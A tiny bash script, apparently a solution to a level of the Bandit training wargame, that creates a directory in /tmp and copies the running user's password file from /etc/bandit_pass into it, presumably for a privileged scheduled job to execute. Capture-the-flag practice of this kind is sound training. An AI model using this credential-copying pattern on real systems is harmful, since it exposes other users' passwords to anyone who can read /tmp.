#!/bin/bash

myname=$(whoami)
mkdir /tmp/deadbeef23
cat /etc/bandit_pass/$myname >> /tmp/deadbeef23/pass


